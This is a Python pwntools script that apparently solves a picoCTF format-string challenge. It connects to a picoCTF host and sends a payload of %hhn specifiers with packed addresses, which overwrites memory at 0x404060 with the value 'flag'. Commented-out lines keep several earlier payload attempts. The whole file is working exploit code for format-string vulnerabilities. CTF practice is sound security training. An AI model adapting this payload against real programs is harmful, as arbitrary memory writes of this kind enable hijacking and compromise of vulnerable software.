from pwn import *
HOST = "rhea.picoctf.net"
PORT = 52863

write_data = 0x67616c66
write_address = 0x404060

address_offset = 6 + 8 + 6
# str = b"%64c%20$hhn%210c%20$hhn%110c%20$hhnBB%20$lxB" # + b"A"* (40 - 35) + p64(write_address) 
# str = b"%64c%210c%110c%19$lx" #
str = b"%102x%20$hhn%6x%21$hhn%245x%22$hhn%6x%23$hhn"
str = str + b"A"* (6 * 8 - len(str)) + p64(write_address) + p64(write_address + 1) + p64(write_address + 2) + p64(write_address + 3)
# str = fmtstr_payload(8, {write_address: write_data})
# str = b"%500lx"
# str = b"%lx&" * 5 + b"stuff" + b"%lx&" * 139 + b"%lx&"
# str = b"%lxand%lxand%lxand%145$lx"
print(str)
# exit()
with remote(HOST, PORT) as r:
    print(r.recv().decode())
    r.sendline(str)
    print(r.recv().decode())
    print(r.recv().decode())
    print(r.recv().decode())